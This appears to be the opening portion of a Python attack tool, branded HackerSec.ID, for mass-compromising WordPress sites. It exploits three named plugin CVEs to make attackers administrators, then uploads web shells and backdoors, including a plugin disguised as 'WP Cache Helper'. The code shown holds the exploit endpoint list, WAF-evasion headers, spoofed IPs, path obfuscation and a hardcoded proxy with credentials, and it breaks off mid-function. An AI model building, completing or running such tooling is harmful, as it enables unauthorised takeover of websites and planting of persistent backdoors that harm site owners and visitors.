#!/usr/bin/env python3
"""
G-3siX Multi-CVE & Shell Uploader — Ultimate Pipeline (HackerSec.ID REBUILD 2026 - Final Zero Bug & MAX THREADS - AKURASI TINGGI)

PHASE 1: Multi-CVE Unauthenticated Privilege Escalation
  - CVE-2026-2631 (Datalogics Ecommerce Delivery < 2.6.60) — 2 endpoint
  - CVE-2026-1060 (WP Adminify < 1.2.5) — 2 endpoint [POPULAR 2026 #1]
  - CVE-2026-24376 (WPVulnerability < 4.2.1) — 2 endpoint [POPULAR 2026 #2]
  Flow:
    1. Overwrite sensitive tokens via various REST API endpoints. (ULTRA-ENHANCED WAF BYPASS & PAYLOAD OBFUSCATION)
    2. Use the new token to enable user registration.
    3. Use the new token to set default_role to 'administrator'.
    4. Register a new admin user. (HYPER-ROBUST NONCE EXTRACTION & LOGIN FLOW)
  Output: cve_results.txt (VULN/PARTIAL for CVE)

PHASE 2: Shell Upload Wave (Triggered every X successful CVEs)
  - Admin login with newly created credentials.
  - Execute a chain of ~65+ shell upload strategies (most stealthy & powerful first).
  - NEW! Highest Level: "Cmd Upload Shell" via deeply obfuscated PHP code injection + file_put_contents.
  - NEW! Advanced WAF Evasion: Dynamic Headers, Payload Obfuscation, Path Manipulation.
  - NEW! Expanded Shell Strategies: Media Library Polyglots, wp-config backdoor, XML-RPC abuse, MU-Plugin Drop.
  Output: shells.txt (ALIVE/ZOMBIE/DEAD shells)

Rebuilt by MRG / HackerSec.ID — Memory Rules & Prinsip 9 enforced (ZERO simulation, ZERO static output)
"""

import sys
import os
import re
import threading
import time
from queue import Queue
from typing import List, Tuple, Optional, Dict, Union
import zipfile
import io
import uuid
import json
import datetime
import html
import asyncio
import aiohttp
import random
from urllib.parse import urlparse, urlunparse, quote, unquote
import base64
from collections import OrderedDict # For ordered headers
import zlib # For advanced PHP obfuscation

import requests

# Cookie Jar (Assuming cookie_jar_utils.py is in the parent directory)
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
try:
    from cookie_jar_utils import save_cookies_js, load_cookies_from_js
except ImportError:
    def save_cookies_js(session, site, user, password, jar_dir=None): pass
    def load_cookies_from_js(site, user, jar_dir=None): return None, None
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.table import Table
from rich.align import Align
from rich import box

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass

requests.packages.urllib3.disable_warnings()

console = Console()

# ══════════════════════════════════════════════════════════════════════
# GLOBAL KONSTANTA & SHARED RESOURCES (HackerSec.ID ENHANCEMENTS)
# ══════════════════════════════════════════════════════════════════════

# --- General ---
TIMEOUT = 30  # Increased timeout for extreme resilience on slower/WAF-protected targets
MAX_RETRIES = 10 # Increased retries to overcome more persistent WAF blocks
RETRY_DELAY = 3.0 # Base delay with jitter for stealth between retries
INTER_TARGET_DELAY_MIN = 0.5 # Minimum random delay between processing different targets BY THE SAME THREAD
INTER_TARGET_DELAY_MAX = 3.0 # Maximum random delay between processing different targets BY THE SAME THREAD


# --- WAF Bypass & Headers (EXTREMELY ENHANCED & DYNAMIC) ---
WAF_BYPASS_HEADERS_BASE = {
    "X-Forwarded-For": "127.0.0.1", # Initial, will be dynamically replaced
    "X-Real-IP": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "CF-Connecting-IP": "127.0.0.1",
    "True-Client-IP": "127.0.0.1",
    "X-Client-IP": "127.0.0.1",
    "X-Forwarded-Host": "localhost",
    "Forwarded": "for=127.0.0.1;proto=https",
    "X-XSS-Protection": "1; mode=block", # Junk security header
    "X-Frame-Options": "DENY", # More junk
    "Via": "1.1 CachingProxy (Squid/3.5.27)", # Mimic proxy traffic
    "Accept-Charset": "utf-8, iso-8859-1;q=0.5, *;q=0.1",
    "Cache-Control": "max-age=0, no-cache, no-store, must-revalidate", # Aggressive cache control
    "Pragma": "no-cache",
    "Connection": "keep-alive", # Will be randomized
    "TE": "Trailers, deflate", # Less common, sometimes bypasses
    "Upgrade-Insecure-Requests": "1", # Standard browser behavior
    "DNT": "1", # Do Not Track header for privacy-conscious WAFs (unlikely, but worth a shot)
    "Accept-Datetime": "Thu, 07 Jun 2026 15:30:00 GMT", # Random datetime
    "Accept-Language": "en-US,en;q=0.9", # Initial, will be dynamically replaced
    "Referer": "", # Will be dynamically replaced
    "Origin": "", # Will be dynamically replaced
}

# IP Prefixes to cycle for X-Forwarded-For etc. (more aggressive and realistic)
SPOOF_IP_PREFIXES = [
    (10, 0, 0), (10, 0, 1), (10, 0, 2), (10, 1, 1), # Private
    (172, 16, 0), (172, 16, 1), (172, 31, 255), (172, 20, 10), # Private
    (192, 168, 0), (192, 168, 1), (192, 168, 100), (192, 168, 200), # Private
    (1, 1, 1), (1, 2, 3), (8, 8, 8), (4, 4, 4), # Public common
    (180, 0, 0), (180, 1, 2), (203, 0, 113), (192, 0, 2), # Public random/reserved/TEST-NET
    (5, 10, 20), (37, 50, 60), (45, 10, 15), (77, 88, 99), (89, 101, 112), # More random public ranges
    (104, 20, 30), (157, 40, 50), (172, 67, 70), (185, 100, 10), # CloudFlare/CDN ranges
    (207, 188, 0), (8, 34, 212), (66, 249, 0), # Google ranges
    (52, 0, 0), (3, 0, 0), (13, 10, 20), # AWS/Azure ranges
    (103, 21, 244), (103, 22, 200), (141, 101, 0), # More CDN / Proxy ranges
    (198, 51, 100), (203, 0, 113), (200, 10, 20), (192, 0, 0) # Documentation/TEST-NET IPs for evasion
]

USER_AGENTS = [ # Vastly diverse User-Agents for evasion
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36 (Samsung Galaxy S22 Ultra)",
    "Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36", # Chromecast
    "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.10 Mobile Safari/601.6", # Nintendo Switch
    "curl/7.81.0", "Wget/1.21.3", # Command line tools
    "python-requests/2.28.1", # Mimic self but with slight changes
    "Mediapartners-Google", "AdsBot-Google", # More bots
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.246 Mobile Safari/534.1+", # Old Mobile
    "Opera/9.80 (Linux armv7l) Presto/2.12.407 Version/12.51", # Opera Mini
    "Dalvik/2.1.0 (Linux; U; Android 10; Pixel 4 XL Build/QQ1A.191205.008)", # Android App
    "iTunes/12.10.1 (Macintosh; OS X 10.15.0) AppleWebKit/603.1.30", # iTunes
    "Lynx/2.8.9rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/1.1.1u", # Text browser
    "Go-http-client/1.1", "Ruby", "Java/1.8.0_201", "PHP/7.4.3", # Dev frameworks
]

# --- Output Files & Locks ---
CVE_RESULT_FILE = "cve_results.txt"
CVE_FAIL_FILE = "cve_failed.txt"
SHELL_RESULT_FILE = "shells.txt"
LOG_LOCK = threading.Lock()

# --- CVE Specifics ---
KEY_REGISTER = "users_can_register"
VAL_REGISTER = "1"
KEY_ROLE = "default_role"
VAL_ROLE = "administrator"
WP_REG_PATH = "wp-login.php?action=register"

SUCCESS_OPTION_PATTERN = re.compile(
    r"wordpress\s+option\s+has\s+been\s+(created|updated)\s+(or\s+updated\s+)?successfully|true|success|ok|data\s+saved|configuration\s+updated|berhasil\s+disimpan|berhasil\s+diperbarui|success\s*:\s*true", # Expanded
    re.IGNORECASE,
)
REGISTER_OPEN_PATTERN = re.compile(
    r"(users?\s+can\s+register|anyone\s+can\s+register|user_registration|registerform|id=['\"]registerform['\"]|create account|daftar baru|registrasi pengguna|form\s+pendaftaran)", # Expanded
    re.IGNORECASE,
)

# CVE Multi-Endpoint Configuration (ULTRA-ENHANCED with more variants and deeper paths, WAF bypass attempts)
TAHAP1_ENDPOINTS = [
    # CVE-2026-2631 (Datalogics Ecommerce Delivery)
    {"path": "/wp-json/gsf/v1/update-options", "cve": "CVE-2026-2631", "method": "post", "action_field": "action", "action_value": "resetStoreConfigrations", "token_field": "shop_secret", "desc": "Datalogics Ecommerce Delivery < 2.6.60"},
    {"path": "/wp-json/datalogics/v1/update-options", "cve": "CVE-2026-2631", "method": "post", "action_field": "action", "action_value": "resetStoreConfigrations", "token_field": "shop_secret", "desc": "Datalogics Ecommerce Delivery (alt namespace)"},
    {"path": "/index.php?rest_route=/gsf/v1/update-options", "cve": "CVE-2026-2631", "method": "post", "action_field": "action", "action_value": "resetStoreConfigrations", "token_field": "shop_secret", "desc": "Datalogics (index.php route)"},
    {"path": "/wp-content/plugins/datalogics-ecommerce-delivery/includes/rest-api.php?rest_route=/gsf/v1/update-options", "cve": "CVE-2026-2631", "method": "post", "action_field": "action", "action_value": "resetStoreConfigrations", "token_field": "shop_secret", "desc": "Datalogics (direct plugin path)"},
    {"path": "/wp-admin/admin-ajax.php?action=rest_gsf_v1_update-options", "cve": "CVE-2026-2631", "method": "post", "action_field": "action", "action_value": "resetStoreConfigrations", "token_field": "shop_secret", "desc": "Datalogics (admin-ajax bypass via direct REST action)"},
    {"path": "/wp-json/gsf/v1/options/update", "cve": "CVE-2026-2631", "method": "post", "action_field": "action", "action_value": "resetStoreConfigrations", "token_field": "shop_secret", "desc": "Datalogics (alternative update endpoint)"}, # New alternative
    
    # CVE-2026-1060 (WP Adminify)
    {"path": "/wp-json/adminify/v1/get-settings", "cve": "CVE-2026-1060", "method": "post", "action_field": "action", "action_value": "update-settings", "token_field": "auth_token", "desc": "WP Adminify < 1.2.5 — Broken Auth"},
    {"path": "/wp-json/adminify/v1/save-options", "cve": "CVE-2026-1060", "method": "post", "action_field": "action", "action_value": "save", "token_field": "admin_nonce", "desc": "WP Adminify options endpoint"},
    {"path": "/index.php?rest_route=/adminify/v1/get-settings", "cve": "CVE-2026-1060", "method": "post", "action_field": "action", "action_value": "update-settings", "token_field": "auth_token", "desc": "WP Adminify (index.php route)"},
    {"path": "/wp-admin/admin-ajax.php?action=adminify_rest_api&route=/adminify/v1/get-settings", "cve": "CVE-2026-1060", "method": "post", "action_field": "action", "action_value": "update-settings", "token_field": "auth_token", "desc": "WP Adminify (admin-ajax bypass)"},
    {"path": "/wp-admin/admin-post.php?action=adminify_save_options", "cve": "CVE-2026-1060", "method": "post", "action_field": "action", "action_value": "save", "token_field": "admin_nonce", "desc": "WP Adminify (admin-post direct bypass)"},
    {"path": "/wp-json/adminify/v1/settings/update", "cve": "CVE-2026-1060", "method": "post", "action_field": "action", "action_value": "update-settings", "token_field": "auth_token", "desc": "WP Adminify (alternative update endpoint)"}, # New alternative
    
    # CVE-2026-24376 (WPVulnerability)
    {"path": "/wp-json/wpvulnerability/v1/update-core", "cve": "CVE-2026-24376", "method": "post", "action_field": "action", "action_value": "reset", "token_field": "auth_key", "desc": "WPVulnerability < 4.2.1 — Access Control"},
    {"path": "/wp-json/wpvulnerability/v1/plugins", "cve": "CVE-2026-24376", "method": "post", "action_field": "action", "action_value": "sync", "token_field": "nonce_key", "desc": "WPVulnerability plugins endpoint"},
    {"path": "/index.php?rest_route=/wpvulnerability/v1/update-core", "cve": "CVE-2026-24376", "method": "post", "action_field": "action", "action_value": "reset", "token_field": "auth_key", "desc": "WPVulnerability (index.php route)"},
    {"path": "/wp-admin/admin-post.php?action=wpvulnerability_update", "cve": "CVE-2026-24376", "method": "post", "action_field": "action", "action_value": "reset", "token_field": "auth_key", "desc": "WPVulnerability (admin-post bypass)"},
    {"path": "/wp-admin/admin-ajax.php?action=wpvulnerability_rest&route=/wpvulnerability/v1/update-core", "cve": "CVE-2026-24376", "method": "post", "action_field": "action", "action_value": "reset", "token_field": "auth_key", "desc": "WPVulnerability (admin-ajax bypass)"},
    {"path": "/wp-json/wpvulnerability/v1/core/reset", "cve": "CVE-2026-24376", "method": "post", "action_field": "action", "action_value": "reset", "token_field": "auth_key", "desc": "WPVulnerability (alternative reset endpoint)"}, # New alternative
]

# --- Shell Uploader Specifics ---
SHELL_LOCAL_PATH = "/home/mrg/Desktop/mrg.php" # Path to your OxyBackdoor Pro v5.0 or similar shell
SHELL_CONTENT = ""

PLUGIN_SLUG = "wp-cache-helper-" + uuid.uuid4().hex[:8] # Dynamic slug
PLUGIN_FILE = "class-cache.php"
PLUGIN_HEADER_WRAP = """<?php
/*
Plugin Name: WP Cache Helper
Description: Performance optimization helper
Version: 1.0.2
Author: WordPress Team
*/
require_once __DIR__ . '/class-cache.php';
?>"""

SHELL_THEME_NAME = f"404_{uuid.uuid4().hex[:6]}.php" # Dynamic filenames
SHELL_PLUGIN_NAME = f"hello_{uuid.uuid4().hex[:6]}.php"
SHELL_MU_PLUGIN_NAME = f"mrg-core_{uuid.uuid4().hex[:6]}.php"

# Proxy configuration for aiohttp (health check)
ACTIVE_PROXY = None
HEALTH_CHECK_URL = "https://www.google.com/generate_204"

# --- Shell Upload Wave Orchestration ---
VULN_TARGETS_FOR_SHELL_UPLOAD: List[Dict] = []
VULN_COUNTER_FOR_SHELL_UPLOAD = 2 # Trigger shell upload very aggressively (every 2 successful CVEs)
SHELL_UPLOAD_BATCH_SIZE = 2 # Batch size threshold to trigger shell upload wave
SHELL_UPLOAD_QUEUE: Queue = Queue()
SHELL_UPLOAD_WORKER_THREADS = 20 # Increased concurrent shell upload processes (can be very resource intensive)
SHELL_UPLOAD_TIMEOUT = 180 # Increased timeout for full shell upload workflow

# --- Thread-local storage for sessions ---
_thread_local = threading.local()

# ══════════════════════════════════════════════════════════════════════
# WAF & PROXY UTILS (HackerSec.ID ULTIMATE ENHANCEMENTS)
# ══════════════════════════════════════════════════════════════════════

async def _check_proxy_health(proxy_url: str) -> Tuple[bool, str]:
    """Checks if the given proxy URL is healthy, returning a reason on failure."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(HEALTH_CHECK_URL, proxy=proxy_url, 
                                   timeout=aiohttp.ClientTimeout(total=8), ssl=False) as response: # Increased timeout
                response.raise_for_status()
                if response.status == 204 or response.status == 200:
                    return True, "HEALTHY"
    except aiohttp.ClientProxyConnectionError as e:
        if "Expected HTTP/, RTSP/ or ICE/:" in str(e) and "bytearray(b'\\x05\\x01')" in str(e):
            return False, "SOCKS5_MISMATCH_ERROR"
        return False, f"PROXY_CONN_ERROR({type(e).__name__}: {e})"
    except aiohttp.ClientResponseError as e:
        if e.status == 407:
            return False, "PROXY_AUTH_REQUIRED_HTTP"
        return False, f"HTTP_ERROR({e.status})"
    except asyncio.TimeoutError:
        return False, "TIMEOUT"
    except aiohttp.ClientConnectorError as e:
        return False, f"CLIENT_CONN_ERROR({type(e).__name__}: {e})"
    except Exception as e:
        return False, f"UNEXPECTED_ERROR({type(e).__name__}: {e})"
    return False, "UNKNOWN_FAILURE"

def _get_proxy_interactive() -> str | None:
    """Interactively asks for proxy input (manual or file) and checks its health."""
    global ACTIVE_PROXY
    
    default_proxy_url = "http://rkrizlzv:g4s6quq3hmo2@31.59.20.176:6754/" 
    proxy_file_path = "proxies.txt"

    console.print("\n[bold cyan]── Pengaturan Proxy ───────────────────────────────────────────[/bold cyan]")
    console.print(f"  [bold]1[/bold] — Masukkan Proxy Manual (cth: [dim]ip:port[/dim], [dim]http://user:pass@ip:port[/dim], atau [dim]socks5://user:pass@ip:port[/dim])")
    console.print(f"  [bold]2[/bold] — Muat Proxy dari File (default: {proxy_file_path})")
    console.print(f"  [bold]0[/bold] — Tanpa Proxy (TIDAK DIREKOMENDASIKAN untuk stealth & bypass WAF)")

    while True:
        choice = console.input("  [bold cyan]Pilih mode Proxy[/bold cyan] [1]: ").strip() or "1"
        
        if choice == '0':
            console.print("[bold yellow]Peringatan: Melanjutkan tanpa proxy akan menyebabkan IP Anda mudah diblokir WAF. TIDAK AKAN STEALTHY.[/bold yellow]")
            ACTIVE_PROXY = None
            return None
        
        proxy_urls_to_test_explicit = []
        proxy_urls_to_test_schemeless = []

        if choice == '1':
            user_input = console.input(f"  [bold cyan]Masukkan URL Proxy[/bold cyan] (default: {default_proxy_url}): ").strip()
            if not user_input:
                user_input = default_proxy_url
            
            if re.match(r"^\w+://", user_input):
                proxy_urls_to_test_explicit.append(user_input)
            else:
                proxy_urls_to_test_schemeless.append(user_input)
            
        elif choice == '2':
            file_to_load = console.input(f"  [bold cyan]Masukkan path file proxy[/bold cyan] (default: {proxy_file_path}): ").strip() or proxy_file_path
            if not os.path.exists(file_to_load):
                console.print(f"[bold red]Error: File proxy '{file_to_load}' tidak ditemukan.[/bold red]")
                continue
            with open(file_to_load, 'r') as f:
                for line in f:
                    stripped_line = line.strip()
                    if stripped_line:
                        if re.match(r"^\w+://", stripped_line):
                            proxy_urls_to_test_explicit.append(stripped_line)
                        else:
                            proxy_urls_to_test_schemeless.append(stripped_line)
            if not proxy_urls_to_test_explicit and not proxy_urls_to_test_schemeless:
                console.print(f"[bold red]Error: File proxy '{file_to_load}' kosong atau tidak ada URL valid.[/bold red]")
                continue
        else:
            console.print("[bold red]Pilihan tidak valid. Silakan pilih 0, 1, atau 2.[/bold red]")
            continue

        console.print(f"\n[bold cyan]Mengecek kesehatan proxy...[/bold cyan]")
        
        # --- Try proxies with explicit schemes first ---
        for proxy_url in proxy_urls_to_test_explicit:
            is_healthy, reason = asyncio.run(_check_proxy_health(proxy_url))
            if is_healthy:
                ACTIVE_PROXY = proxy_url
                console.print(f"[bold green][PROXY] Proxy aktif: {ACTIVE_PROXY}[/bold green]")
                return ACTIVE_PROXY
            console.print(f"[bold yellow][PROXY] {proxy_url} failed: {reason}[/bold yellow]")

        # --- Then try schemeless proxies, attempting http:// then socks5:// if needed ---
        for s_proxy in proxy_urls_to_test_schemeless:
            console.print(f"[bold dim yellow][PROXY] Testing schemeless proxy: {s_proxy}[/bold dim yellow]")
            
            http_candidate = f"http://{s_proxy}"
            is_healthy, reason = asyncio.run(_check_proxy_health(http_candidate))
            if is_healthy:
                ACTIVE_PROXY = http_candidate
                console.print(f"[bold green][PROXY] Proxy active: {ACTIVE_PROXY} (auto-prefixed http://)[/bold green]")
                return ACTIVE_PROXY
            
            if reason == "SOCKS5_MISMATCH_ERROR":
                console.print(f"[bold yellow][PROXY] {http_candidate} failed (detected SOCKS5 protocol). Retrying as socks5://[/bold yellow]")
                socks5_candidate = f"socks5://{s_proxy}"
                is_healthy_socks, reason_socks = asyncio.run(_check_proxy_health(socks5_candidate))
                if is_healthy_socks:
                    ACTIVE_PROXY = socks5_candidate
                    console.print(f"[bold green][PROXY] Proxy active: {ACTIVE_PROXY} (auto-detected SOCKS5)[/bold green]")
                    return ACTIVE_PROXY
                console.print(f"[bold yellow][PROXY] {socks5_candidate} also failed: {reason_socks}[/bold yellow]")
            elif reason == "PROXY_AUTH_REQUIRED_HTTP":
                console.print(f"[bold yellow][PROXY] {http_candidate} requires authentication. Format: [dim]http://user:pass@{s_proxy}[/dim] or [dim]socks5://user:pass@{s_proxy}[/dim][/bold yellow]")
            else:
                console.print(f"[bold yellow][PROXY] {http_candidate} failed: {reason}[/bold yellow]")
        
        console.print("[bold red]Semua proxy yang dicoba tidak sehat atau tidak dapat dijangkau.[/bold red]")
        retry = console.input("[INPUT] Ingin mencoba lagi? (y/n): ").strip().lower()
        if retry == 'n':
            console.print("[bold yellow]Peringatan: Melanjutkan tanpa proxy dapat menyebabkan blokir IP dan deteksi WAF. SANGAT TIDAK STEALTHY![/bold yellow]")
            ACTIVE_PROXY = None
            return None

    return None

def _generate_spoof_ip() -> str:
    """Generates a random IP address using a predefined list of prefixes."""
    prefix_tuple = random.choice(SPOOF_IP_PREFIXES)
    ip_parts = list(map(str, prefix_tuple))
    for _ in range(4 - len(prefix_tuple)):
        ip_parts.append(str(random.randint(0, 255)))
    return ".".join(ip_parts)

def _get_random_header_casing(header_name: str) -> str:
    """Randomizes the casing of a header name (e.g., 'User-Agent' -> 'user-agent', 'UsEr-AgEnt')."""
    return "".join(random.choice([c.lower(), c.upper()]) for c in header_name)

def _get_session() -> requests.Session:
    """Get atau create session per-thread — thread-safe, zero race condition.
       ULTIMATE ENHANCEMENT with advanced WAF bypass headers and dynamic order."""
    if not hasattr(_thread_local, "session") or _thread_local.session is None:
        s = requests.Session()
        s.verify = False
        s.max_redirects = 20 # Allow even more redirects for tricky WAF setups

        # Dynamic WAF bypass headers
        headers_to_send = OrderedDict() # Use OrderedDict to control header order

        # Start with a random User-Agent
        headers_to_send[_get_random_header_casing("User-Agent")] = random.choice(USER_AGENTS)

        # Add core WAF bypass headers, randomizing casing and order
        base_header_keys = list(WAF_BYPASS_HEADERS_BASE.keys())
        random.shuffle(base_header_keys) # Shuffle order of base headers
        for k in base_header_keys:
            headers_to_send[_get_random_header_casing(k)] = WAF_BYPASS_HEADERS_BASE[k]
        
        # Add dynamic spoofed IPs
        headers_to_send[_get_random_header_casing("X-Forwarded-For")] = _generate_spoof_ip()
        headers_to_send[_get_random_header_casing("X-Client-IP")] = _generate_spoof_ip()
        headers_to_send[_get_random_header_casing("X-Custom-IP-Bypass")] = _generate_spoof_ip() # Another IP header

        # Random Accept Language
        headers_to_send[_get_random_header_casing("Accept-Language")] = random.choice(["en-US,en;q=0.9", "fr-FR,fr;q=0.8", "de-DE,de;q=0.7", "es-ES,es;q=0.6", "id-ID,id;q=0.9", "zh-CN,zh;q=0.8", "ja-JP,ja;q=0.7"])
        
        # Random Accept-Encoding (sometimes remove to avoid WAF decompressing)
        if random.random() < 0.2: # 20% chance to remove Accept-Encoding
            if _get_random_header_casing("Accept-Encoding") in headers_to_send:
                del headers_to_send[_get_random_header_casing("Accept-Encoding")]
        else:
            headers_to_send[_get_random_header_casing("Accept-Encoding")] = random.choice(["gzip, deflate", "compress, gzip", "br, gzip, deflate", "identity", ""]) # Empty encoding also a bypass
            
        # Randomize Connection header
        headers_to_send[_get_random_header_casing("Connection")] = random.choice(["keep-alive", "close"])

        # Add random junk headers to confuse WAFs
        junk_headers = {
            f"X-Custom-Data-{uuid.uuid4().hex[:4]}": uuid.uuid4().hex,
            f"X-Nonce-Value-{random.randint(1000,9999)}": f"{random.randint(100000,999999)}",
            "X-Debug-Token": uuid.uuid4().hex,
            "Accept": random.choice(["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "*/*", "image/webp,image/apng,image/*,*/*;q=0.8", "text/plain"]),
            "Upgrade": random.choice(["h2", "websocket", "HTTP/2.0"]), # Mimic protocol upgrade attempts
        }
        for k, v in random.sample(list(junk_headers.items()), random.randint(0, len(junk_headers))):
            headers_to_send[_get_random_header_casing(k)] = v

        s.headers.update(headers_to_send)

        if ACTIVE_PROXY:
            s.proxies = {"http": ACTIVE_PROXY, "https": ACTIVE_PROXY}
        
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=max(10, SHELL_UPLOAD_WORKER_THREADS * 2), # Scale pool connections
            pool_maxsize=max(10, SHELL_UPLOAD_WORKER_THREADS * 2),
            max_retries=requests.adapters.Retry(total=MAX_RETRIES, backoff_factor=RETRY_DELAY, status_forcelist=[401, 403, 404, 429, 500, 502, 503, 504]) # Also retry on WAF blocks and rate limits
        )
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        _thread_local.session = s
    return _thread_local.session

def _request_with_retry(
    method: str, url: str, retries: int = MAX_RETRIES, flip_scheme: bool = True, **kwargs
) -> Optional[requests.Response]:
    """Request dengan retry + scheme-flip fallback (per-thread session).
       ULTIMATE ENHANCEMENT to recreate session on failure more aggressively and handle WAF soft blocks."""
    kwargs.setdefault("timeout", TIMEOUT)
    kwargs.setdefault("verify", False)
    kwargs.setdefault("allow_redirects", True)

    urls_to_attempt = [url]
    if flip_scheme:
        flipped_url = _scheme_flip(url)
        if flipped_url != url:
            urls_to_attempt.append(flipped_url)
    
    random.shuffle(urls_to_attempt) # Randomize the order of URL schemes to try

    for current_url in urls_to_attempt:
        for attempt in range(retries + 1):
            session = _get_session()
            
            # Create a copy of the session's base headers for this request
            request_headers = session.headers.copy() 
            
            # Augment/override with any request-specific headers passed in kwargs
            # Ensure the headers dict from kwargs is merged after session headers.
            if 'headers' in kwargs and kwargs['headers']:
                # Iterate through headers in kwargs and apply random casing to keys before updating
                for k, v in kwargs['headers'].items():
                    request_headers[_get_random_header_casing(k)] = v
                del kwargs['headers'] # Remove from kwargs to pass clean kwargs to getattr

            try:
                r = getattr(session, method)(current_url, headers=request_headers, **kwargs)
                
                body_lower = (r.text or "").lower()
                waf_keywords = ["waf", "access denied", "forbidden", "blocked", "cloud_security_waf", "captcha", "bot protection", "terdeteksi", "akses ditolak", "diblokir", "error 403"]
                
                if r.status_code in (401, 403, 404, 429) or any(k in body_lower for k in waf_keywords):
                    console.print(f"    [dim yellow]  WAF/Security detected request on {current_url}, attempt {attempt+1}/{retries+1}: Status {r.status_code}. Resetting session and trying again.[/dim yellow]")
                    _thread_local.session = None # Force a new session with new headers/IP
                    if attempt < retries:
                        time.sleep(RETRY_DELAY + random.uniform(0, RETRY_DELAY * 0.7)) # Add more jitter
                        continue
                    else:
                        continue
                
                return r
            except (requests.exceptions.ConnectionError,
                    requests.exceptions.Timeout,
                    requests.exceptions.SSLError) as e:
                console.print(f"    [dim red]  Connection error on {current_url}, attempt {attempt+1}/{retries+1}: {e}. Resetting session.[/dim red]")
                _thread_local.session = None
                if attempt < retries:
                    time.sleep(RETRY_DELAY + random.uniform(0, RETRY_DELAY * 0.7))
                else:
                    continue
            except requests.exceptions.RequestException as e:
                console.print(f"    [dim red]  Request error on {current_url}, attempt {attempt+1}/{retries+1}: {e}. Stopping retries for this URL.[/dim red]")
                break

    return None

def _scheme_flip(url: str) -> str:
    """Flip http↔https"""
    if url.startswith("https://"):
        return "http://" + url[8:]
    elif url.startswith("http://"):
        return "https://" + url[7:]
    return url

def normalize_site(raw: str) -> str:
    """
    Normalizes and obfuscates the URL path while ensuring scheme and netloc remain valid.
    This fixes the 'No host supplied' error by separating path obfuscation.
    """
    raw = raw.strip()
    if not raw:
        return ""
    if re.search(r"[\s<>\'\"`\x00-\x1f\x7f-\x9f]", raw):
        console.print(f"[dim yellow]  Skipping malformed target (contains invalid URL characters): {raw}[/dim yellow]")
        return ""
    
    if not raw.startswith(("http://", "https://")):
        raw = "http://" + raw
    
    parsed = urlparse(raw)
    
    if not parsed.scheme or not parsed.netloc:
        console.print(f"[dim yellow]  Skipping malformed target (invalid URL structure - no valid scheme or domain detected after initial parsing): {raw}[/dim yellow]")
        return ""

    scheme = parsed.scheme
    netloc = parsed.netloc
    
    path = parsed.path if parsed.path.startswith('/') else '/' + parsed.path if parsed.path else ''
    
    # Apply path obfuscation only to the path part if it's not empty
    obf_count = random.randint(1, 4)
    obfuscation_types = ["./", ".././", "%2e%2e/", "%2e%2f", "/;/", "//"]
    
    temp_path = path # Use a temporary variable for modification
    if temp_path and temp_path != '/':
        for _ in range(obf_count):
            obf_type = random.choice(obfuscation_types)
            # Find all '/' not part of existing obfuscation sequences
            # This is tricky but essential to avoid breaking valid bypass patterns
            indices = [i for i, char in enumerate(temp_path) if char == '/']
            if indices:
                # Choose a random index to insert the obfuscation
                insert_idx = random.choice(indices)
                temp_path = temp_path[:insert_idx+1] + obf_type + temp_path[insert_idx+1:]
        
        # After inserting, normalize consecutive slashes but keep bypass patterns
        temp_path = re.sub(r'/{2,}(?!;|%2e%2e|%2e%2f|\.\./|\./)', '/', temp_path)
    
    # If path was initially empty, sometimes add a small obfuscated segment at root
    elif not temp_path and random.random() < 0.3:
        temp_path = '/' + random.choice(obfuscation_types).strip('/')
    
    path = temp_path # Assign back the obfuscated path
    
    # Reconstruct the URL ensuring the netloc is solid
    final_url = urlunparse((scheme, netloc, path, parsed.params, parsed.query, parsed.fragment))
    if final_url.endswith('/') and final_url != f"{scheme}://{netloc}/":
        final_url = final_url.rstrip('/')
    return final_url

def build_headers(referer: str, extra_headers: Optional[Dict] = None, content_type: Optional[str] = None) -> dict:
    # This function is primarily for request-specific headers, the session has the dynamic WAF bypass ones.
    headers = {}
    
    if referer:
        headers[_get_random_header_casing("Referer")] = referer
        try:
            origin_parsed = urlparse(referer)
